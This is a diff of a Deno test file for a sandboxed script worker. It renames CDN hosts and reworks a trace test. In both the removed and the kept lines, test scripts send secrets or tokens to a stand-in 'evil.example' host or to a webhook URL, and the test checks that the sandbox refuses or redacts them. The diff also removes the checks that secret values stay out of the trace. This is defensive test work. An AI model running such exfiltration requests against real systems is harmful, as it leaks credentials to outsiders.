@@ -4,14 +4,14 @@ import { readFileSync } from "node:fs";
 import { Buffer } from "node:buffer";
 
 // One CDN host serves every family under a path prefix (/std, /js).
-const CDN_HOST = "cdn.edgepython.com";
+const CDN_HOST = "cdn.edgelang.dev";
 // The staged CDN this run tests, served on loopback from cdn/ in CI and locally alike.
 const BASE = Deno.env.get("EDGE_CDN_BASE")?.replace(/\/$/, "");
 if (!BASE) throw new Error("set EDGE_CDN_BASE (make serve)");
 // The registry the lock is read from, the real one unless a run moves it.
-const SITE = (Deno.env.get("EDGE_SITE_BASE") ?? "https://edgepython.com").replace(/\/$/, "");
+const SITE = (Deno.env.get("EDGE_SITE_BASE") ?? "https://edgelang.dev").replace(/\/$/, "");
 
-const REPO = new URL("../../", import.meta.url).pathname; // edge-python/ repo root
+const REPO = new URL("../../", import.meta.url).pathname; // the repo root
 const cases = JSON.parse(readFileSync(new URL("./js.json", import.meta.url)));
 const PKG = JSON.parse(readFileSync(new URL("./app/edge.json", import.meta.url)));
 // Negative fixtures, only their own cases import them, abi2 and ui fail to load by design.
@@ -21,7 +21,7 @@ const star = (imports) => Object.entries(imports).flatMap(([k, v]) => (FIXTURES.
 const PRELUDE = star(PKG.imports).join("\n") + "\n";
 const TYPES = {
     ".js": "text/javascript", ".wasm": "application/wasm", ".html": "text/html",
-    ".py": "text/x-python", ".json": "application/json",
+    ".mini": "text/plain", ".json": "application/json",
 };
 
 /* The official origin answers from BASE, decoded bytes and the CDN's own headers, CORS included. */
@@ -53,7 +53,7 @@ async function lockOf(imports) {
     return lock;
 }
 
-/* Minimal wasm-pdk module built by hand, `__edge_abi_version` reports `abi` and `boom` traps when called. */
+/* a minimal plugin module built by hand whose `boom` traps and `__edge_abi_version` reports `abi` */
 function pdkModule(abi) {
     const enc = new TextEncoder();
     const leb = (n) => { const out = []; do { let b = n & 0x7f; n >>>= 7; if (n !== 0) b |= 0x80; out.push(b); } while (n !== 0); return out; };
@@ -144,7 +144,7 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
             const worker = globalThis.worker;
             const chunks = [];
             worker.onOutput((c) => chunks.push(c));
-            const src = "history = []\nwhile True:\n    m = receive()\n    if m == 'stop':\n        break\n    history.append(m)\nprint('|'.join(history))";
+            const src = "history = []\nwhile true:\n    m = receive()\n    if m == 'stop':\n        break\n    history.append(m)\nprint('|'.join(history))";
             const running = worker.run(src);
             const parked = async () => {
                 for (let i = 0; i < 100; i++) {
@@ -228,34 +228,28 @@ Deno.test("js: createWorker runs the corpus in a page", async () => {
         // A cap the embedder declares reaches the engine, the sandbox default finishes this loop.
         const capped = await page.evaluate(async (host) => {
             const { createWorker } = await import(host);
-            const worker = await createWorker({ wasmUrl: "https://cdn.edgepython.com/compiler.wasm", limits: { ops: 1000 } });
+            const worker = await createWorker({ wasmUrl: "https://cdn.edgelang.dev/edge.wasm", limits: { ops: 1000 } });
             const { out } = await worker.run("n = 0\nfor i in range(100000):\n    n = n + 1\nprint(n)");
             worker.dispose();
             return out;
         }, `https://${CDN_HOST}/js/src/index.js`);
         if (!capped.includes("budget exceeded")) throw new Error(`declared op cap: expected a budget error, got ${JSON.stringify(capped)}`);
 
-        // A traced run reports what it reached, a secret by its name, a url without its query and a secret value hidden wherever it lands.
+        // a traced run reports what it reached and a url without its query
         const trace = await page.evaluate(async (host) => {
             const { createWorker } = await import(host);
-            const secrets = { API_KEY: "k-123", HOOK: "https://hooks.example/services/T0/B0/s3cr3tT0k3n", TOKEN: "d1sc0rdT0k3n" };
-            const worker = await createWorker({ wasmUrl: "https://cdn.edgepython.com/compiler.wasm", trace: true, permissions: { main: ["secret:API_KEY", "secret:HOOK", "secret:TOKEN", "net"] }, secrets });
+            const worker = await createWorker({ wasmUrl: "https://cdn.edgelang.dev/edge.wasm", trace: true, permissions: { main: ["net"] } });
             const events = [];
             worker.onTrace((event) => events.push(event));
-            await worker.run("import net\nimport secret\nkey = secret.read('API_KEY')\nprint('read it')\nprint('key is ' + key)\nfor method, url in [('GET', 'https://evil.example/x?token=t-456'), ('POST', secret.read('HOOK')), ('POST', 'https://evil.example/x/' + secret.read('TOKEN'))]:\n    try:\n        net.request(method, url, {}, None)\n    except PermissionError as e:\n        pass\n");
+            await worker.run("import net\nprint('read it')\ntry:\n    net.request('GET', 'https://evil.example/x?token=t-456', {}, nil)\nexcept PermissionError as e:\n    pass\n");
             worker.dispose();
             return events;
         }, `https://${CDN_HOST}/js/src/index.js`);
         const said = JSON.stringify(trace);
         const call = (name) => trace.find((event) => event.kind === "call" && event.call === name);
-        if (call("secret.read")?.scope !== "API_KEY" || call("secret.read")?.outcome !== "ok") throw new Error(`trace: no secret.read of API_KEY in ${said}`);
-        if (call("net.request")?.scope !== "GET evil.example/x" || call("net.request")?.outcome !== "PermissionError") throw new Error(`trace: no refused request in ${said}`);
+        if (call("net.request")?.scope !== "GET evil.example/x" || call("net.request")?.outcome !== "denied") throw new Error(`trace: no refused request in ${said}`);
         if (!trace.some((event) => event.kind === "print" && event.text.includes("read it"))) throw new Error(`trace: no print in ${said}`);
-        if (said.includes("k-123") || said.includes("t-456") || said.includes("s3cr3tT0k3n") || said.includes("d1sc0rdT0k3n")) throw new Error(`trace: a secret or a query leaked into ${said}`);
-        const scopes = trace.filter((event) => event.kind === "call" && event.call === "net.request").map((event) => event.scope);
-        if (!scopes.includes("POST ho…")) throw new Error(`trace: a secret that is a whole url was not hidden whole in ${said}`);
-        if (!scopes.includes("POST evil.example/x/d1…")) throw new Error(`trace: a secret in a url path was not cut to two characters in ${said}`);
-        if (!trace.some((event) => event.kind === "print" && event.text.trimEnd() === "key is …")) throw new Error(`trace: a short secret in a print was not hidden in ${said}`);
+        if (said.includes("t-456")) throw new Error(`trace: a query leaked into ${said}`);
         if (!trace.every((event) => event.at >= 0)) throw new Error(`trace: an event before the run began in ${said}`);
         if (trace[0]?.kind !== "run" || !(trace[0].epoch > 0)) throw new Error(`trace: no run start leads ${said}`);
 
